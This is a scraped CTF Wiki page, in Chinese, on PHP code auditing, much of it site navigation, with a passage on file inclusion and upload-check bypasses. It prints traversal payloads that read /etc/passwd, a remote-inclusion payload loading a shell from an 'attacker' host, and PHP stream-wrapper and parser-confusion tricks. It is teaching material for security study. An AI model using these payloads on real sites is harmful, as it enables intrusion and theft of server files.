  <a href="#_18" title="寻找源代码备份" class="md-nav__link">
    寻找源代码备份
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hg" title="hg 源码泄露" class="md-nav__link">
    hg 源码泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#git" title="Git 源码泄露" class="md-nav__link">
    Git 源码泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ds_store" title=".DS_Store 文件泄露" class="md-nav__link">
    .DS_Store 文件泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" title="网站备份文件" class="md-nav__link">
    网站备份文件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#svn" title="SVN 泄露" class="md-nav__link">
    SVN 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-inf-webxml" title="WEB-INF / web.xml 泄露" class="md-nav__link">
    WEB-INF / web.xml 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cvs" title="CVS 泄露" class="md-nav__link">
    CVS 泄露
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Reverse
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/introduction/" title="软件逆向工程简介" class="md-nav__link">
      软件逆向工程简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5-2" type="checkbox" id="nav-5-2">
    
    <label class="md-nav__link" for="nav-5-2">
      脱壳技术
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-5-2">
        脱壳技术
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/packer-introduction/" title="保护壳简介" class="md-nav__link">
      保护壳简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/trace/" title="单步跟踪法" class="md-nav__link">
      单步跟踪法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/esp/" title="ESP 定律法" class="md-nav__link">
      ESP 定律法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/direct-oep/" title="一步到达 OEP 法" class="md-nav__link">
      一步到达 OEP 法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/memory/" title="内存镜像法" class="md-nav__link">
      内存镜像法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/last-exception/" title="最后一次异常法" class="md-nav__link">
      最后一次异常法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/sfx/" title="SFX 法" class="md-nav__link">
      SFX 法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/fix-iat/" title="DUMP 及 IAT 重建" class="md-nav__link">
      DUMP 及 IAT 重建
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/manually-fix-iat/" title="手动查找 IAT 并使用 ImportREC 重建" class="md-nav__link">
      手动查找 IAT 并使用 ImportREC 重建
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unpack/unpack-dll/" title="DLL 文件脱壳" class="md-nav__link">
      DLL 文件脱壳
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/unicorn/introduction/" title="Unicorn Engine 简介" class="md-nav__link">
      Unicorn Engine 简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5-4" type="checkbox" id="nav-5-4">
    
    <label class="md-nav__link" for="nav-5-4">
      反调试技术
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-5-4">
        反调试技术
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/anti-debug/ntglobalflag/" title="NtGlobalFlag" class="md-nav__link">
      NtGlobalFlag
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/anti-debug/heap-flags/" title="Heap Flags" class="md-nav__link">
      Heap Flags
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/anti-debug/the-heap/" title="The Heap" class="md-nav__link">
      The Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/anti-debug/int-3/" title="Interrupt 3" class="md-nav__link">
      Interrupt 3
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/anti-debug/isdebuggerpresent/" title="IsDebuggerPresent" class="md-nav__link">
      IsDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/anti-debug/checkremotedebuggerpresent/" title="CheckRemoteDebuggerPresent" class="md-nav__link">
      CheckRemoteDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/anti-debug/ntqueryinformationprocess/" title="NtQueryInformationProcess" class="md-nav__link">
      NtQueryInformationProcess
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/anti-debug/junk-code/" title="花指令" class="md-nav__link">
      花指令
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/anti-debug/example/" title="反调试技术例题" class="md-nav__link">
      反调试技术例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5-5" type="checkbox" id="nav-5-5">
    
    <label class="md-nav__link" for="nav-5-5">
      Linux 逆向技术
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-5-5">
        Linux 逆向技术
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/linux/ld_preload/" title="LD_PRELOAD" class="md-nav__link">
      LD_PRELOAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/linux/false-disasm/" title="False Disassembly" class="md-nav__link">
      False Disassembly
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/linux/detect-bp/" title="Detecting Breakpoints" class="md-nav__link">
      Detecting Breakpoints
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../reverse/linux/detect-dbg/" title="Detecting debugging" class="md-nav__link">
      Detecting debugging
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
    
    <label class="md-nav__link" for="nav-6-1">
      栈溢出
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-1">
        栈溢出
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/stackoverflow/stack_intro/" title="栈介绍" class="md-nav__link">
      栈介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/stackoverflow/stackoverflow_basic/" title="栈溢出原理" class="md-nav__link">
      栈溢出原理
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/stackoverflow/basic_rop/" title="基本 ROP" class="md-nav__link">
      基本 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/stackoverflow/others/" title="花式栈溢出技巧" class="md-nav__link">
      花式栈溢出技巧
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/stackoverflow/medium_rop/" title="中级 ROP" class="md-nav__link">
      中级 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/stackoverflow/advanced_rop/" title="高级 ROP" class="md-nav__link">
      高级 ROP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">
    
    <label class="md-nav__link" for="nav-6-2">
      格式化字符串漏洞
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-2">
        格式化字符串漏洞
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/fmtstr/fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
      格式化字符串漏洞原理介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
      格式化字符串漏洞利用
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
      格式化字符串漏洞例子
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/fmtstr/fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
      格式化字符串漏洞检测
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-3" type="checkbox" id="nav-6-3">
    
    <label class="md-nav__link" for="nav-6-3">
      堆利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-3">
        堆利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/introduction/" title="堆利用简介" class="md-nav__link">
      堆利用简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/heap_overview/" title="堆概述" class="md-nav__link">
      堆概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/heap_structure/" title="堆相关数据结构" class="md-nav__link">
      堆相关数据结构
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/heap_implementation_details/" title="深入理解堆的实现" class="md-nav__link">
      深入理解堆的实现
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/heapoverflow_basic/" title="堆溢出" class="md-nav__link">
      堆溢出
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
      堆中的 Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/unlink/" title="Unlink" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/use_after_free/" title="Use After Free" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/fastbin_attack/" title="Fastbin Attack" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/chunk_extend_overlapping/" title="Chunk Extend / Overlapping" class="md-nav__link">
      Chunk Extend / Overlapping
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
      House Of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/house_of_lore/" title="House of Lore" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/house_of_force/" title="House Of Force" class="md-nav__link">
      House Of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/heap/house_of_orange/" title="House of Orange" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-4" type="checkbox" id="nav-6-4">
    
    <label class="md-nav__link" for="nav-6-4">
      IO_FILE 利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-4">
        IO_FILE 利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/io_file/introduction/" title="FILE 文件结构介绍" class="md-nav__link">
      FILE 文件结构介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/io_file/fake-vtable-exploit/" title="伪造 vtable 劫持程序流程" class="md-nav__link">
      伪造 vtable 劫持程序流程
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/io_file/fsop/" title="FSOP" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/io_file/exploit-in-libc2.24/" title="新版本 libc 下 IO_FILE 的利用" class="md-nav__link">
      新版本 libc 下 IO_FILE 的利用
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-5" type="checkbox" id="nav-6-5">
    
    <label class="md-nav__link" for="nav-6-5">
      条件竞争
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-5">
        条件竞争
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/race-condition/introduction/" title="条件竞争介绍" class="md-nav__link">
      条件竞争介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/race-condition/problem/" title="例题" class="md-nav__link">
      例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-6" type="checkbox" id="nav-6-6">
    
    <label class="md-nav__link" for="nav-6-6">
      整数溢出
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-6">
        整数溢出
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../pwn/integeroverflow/intof/" title="整数溢出原理介绍" class="md-nav__link">
      整数溢出原理介绍
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      Executable
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        Executable
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
    
    <label class="md-nav__link" for="nav-7-1">
      ELF 文件
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-7-1">
        ELF 文件
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../executable/elf/elf_structure/" title="ELF文件基本结构" class="md-nav__link">
      ELF文件基本结构
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../executable/elf/program_loading/" title="程序加载" class="md-nav__link">
      程序加载
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../executable/elf/program_linking/" title="程序链接" class="md-nav__link">
      程序链接
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../executable/elf/running_overview/" title="程序执行流程" class="md-nav__link">
      程序执行流程
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="文件包含" class="md-nav__link">
    文件包含
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" title="本地文件包含" class="md-nav__link">
    本地文件包含
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" title="远程文件包含" class="md-nav__link">
    远程文件包含
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" title="文件上传" class="md-nav__link">
    文件上传
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" title="绕过上传检查" class="md-nav__link">
    绕过上传检查
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" title="变量覆盖" class="md-nav__link">
    变量覆盖
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" title="全局变量覆盖" class="md-nav__link">
    全局变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract" title="extract() 变量覆盖" class="md-nav__link">
    extract() 变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#import_request_variables" title="import_request_variables 变量覆盖" class="md-nav__link">
    import_request_variables 变量覆盖
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#parse_str" title="parse_str() 变量覆盖" class="md-nav__link">
    parse_str() 变量覆盖
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_8" title="命令执行" class="md-nav__link">
    命令执行
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="直接执行代码" class="md-nav__link">
    直接执行代码
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_replace" title="preg_replace() 代码执行" class="md-nav__link">
    preg_replace() 代码执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="动态函数执行" class="md-nav__link">
    动态函数执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="反引号命令执行" class="md-nav__link">
    反引号命令执行
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#curly-syntax" title="Curly Syntax" class="md-nav__link">
    Curly Syntax
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="回调函数" class="md-nav__link">
    回调函数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="反序列化" class="md-nav__link">
    反序列化
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php" title="PHP 特性" class="md-nav__link">
    PHP 特性
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" title="数组" class="md-nav__link">
    数组
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hash" title="魔法 Hash" class="md-nav__link">
    魔法 Hash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_15" title="十六进制转换" class="md-nav__link">
    十六进制转换
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" title="类型转换" class="md-nav__link">
    类型转换
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" title="内置函数的参数的松散性" class="md-nav__link">
    内置函数的参数的松散性
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_18" title="寻找源代码备份" class="md-nav__link">
    寻找源代码备份
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hg" title="hg 源码泄露" class="md-nav__link">
    hg 源码泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#git" title="Git 源码泄露" class="md-nav__link">
    Git 源码泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ds_store" title=".DS_Store 文件泄露" class="md-nav__link">
    .DS_Store 文件泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" title="网站备份文件" class="md-nav__link">
    网站备份文件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#svn" title="SVN 泄露" class="md-nav__link">
    SVN 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-inf-webxml" title="WEB-INF / web.xml 泄露" class="md-nav__link">
    WEB-INF / web.xml 泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cvs" title="CVS 泄露" class="md-nav__link">
    CVS 泄露
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/web/php.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                  <h1>PHP 代码审计</h1>
                
                <h2 id="_1">文件包含<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>常见的导致文件包含的函数有：</p>
<ul>
<li>PHP：<code>include()</code>，<code>include_once()</code>，<code>require()</code>，<code>require_once()</code>，<code>fopen()</code>，<code>readfile()</code> 等</li>
<li>JSP Servlet：<code>ava.io.File()</code>，<code>java.io.FileReader()</code> 等</li>
<li>ASP：<code>includefile</code>，<code>includevirtual</code> 等</li>
</ul>
<p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</p>
<h3 id="_2">本地文件包含<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<p>本地文件包含，Local File Inclusion，LFI。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">include</span> <span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>上述代码存在本地文件包含，可用 %00 截断的方式读取 <code>/etc/passwd</code> 文件内容。</p>
<ul>
<li>
<p><code>%00</code> 截断</p>
<div class="codehilite"><pre><span></span>?file=../../../../../../../../../etc/passwd%00
</pre></div>

<p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。</p>
</li>
<li>
<p>路径长度截断</p>
<div class="codehilite"><pre><span></span>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
</pre></div>

<p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p>
</li>
<li>
<p>点号截断</p>
<div class="codehilite"><pre><span></span>?file=../../../../../../../../../boot.ini/………[…]…………
</pre></div>

<p>只适用 Windows，点号需要长于 256。</p>
</li>
</ul>
<h3 id="_3">远程文件包含<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<p>远程文件包含，Remote File Inclusion，RFI。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;share&quot;</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_share.php&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;sharelink&quot;</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_sharelink.php&quot;</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>构造变量 <code>basePath</code> 的值。</p>
<div class="codehilite"><pre><span></span>/?basePath=http://attacker/phpshell.txt?
</pre></div>

<p>最终的代码执行了</p>
<div class="codehilite"><pre><span></span><span class="x">require_once &quot;http://attacker/phpshell.txt?/action/m_share.php&quot;;</span>
</pre></div>

<p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p>
<ul>
<li>
<p>普通远程文件包含</p>
<div class="codehilite"><pre><span></span>?file=[http|https|ftp]://example.com/shell.txt
</pre></div>

<p>需要 <code>allow_url_fopen=On</code> 并且 <code>allow_url_include=On</code> 。</p>
</li>
<li>
<p>利用 PHP 流 input</p>
<div class="codehilite"><pre><span></span>?file=php://input
</pre></div>

<p>需要 <code>allow_url_include=On</code> 。</p>
</li>
<li>
<p>利用 PHP 流 filter</p>
<div class="codehilite"><pre><span></span>?file=php://filter/convert.base64-encode/resource=index.php
</pre></div>

<p>需要 <code>allow_url_include=On</code> 。</p>
</li>
<li>
<p>利用 data URIs</p>
<div class="codehilite"><pre><span></span>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
</pre></div>

<p>需要 <code>allow_url_include=On</code> 。</p>
</li>
<li>
<p>利用 XSS 执行</p>
<div class="codehilite"><pre><span></span>?file=http://127.0.0.1/path/xss.php?xss=phpcode
</pre></div>

<p>需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p>
</li>
</ul>
<h2 id="_4">文件上传<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够这 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。</p>
<h3 id="_5">绕过上传检查<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>前端检查扩展名</p>
<p>抓包绕过即可。</p>
</li>
<li>
<p><code>Content-Type</code> 检测文件类型</p>
<p>抓包修改 <code>Content-Type</code> 类型，使其符合白名单规则。</p>
</li>
<li>
<p>服务端添加后缀</p>
<p>尝试 <code>%00</code> 截断。</p>
</li>
<li>
<p>服务端扩展名检测</p>
<p>利用解析漏洞。</p>
</li>
<li>
<p>Apache 解析</p>
<p><code>phpshell.php.rar.rar.rar.rar</code> 因为 Apache 不认识 <code>.rar</code> 这个文件类型，所以会一直遍历后缀到 <code>.php</code>，然后认为这是一个 PHP 文件。</p>
</li>
<li>
<p>IIS 解析</p>
<p>IIS 6 下当文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code>。</p>
</li>
<li>
<p>PHP CGI 路径解析</p>
<p>当访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将 <code>test.jpg</code> 当做 PHP 解析， <code>notexist.php</code> 是不存在的文件。此时 Nginx 的配置如下</p>
<div class="codehilite"><pre><span></span><span class="k">location</span> <span class="p">~</span> <span class="sr">\.php$</span> <span class="p">{</span>
  <span class="kn">root</span> <span class="s">html</span><span class="p">;</span>
  <span class="kn">fastcgi_pass</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">9000</span><span class="p">;</span>
  <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
  <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="s">/scripts</span><span class="nv">$fastcgi_script_name</span><span class="p">;</span>
  <span class="kn">include</span> <span class="s">fastcgi_param</span><span class="p">;</span>
<span class="p">}</span>
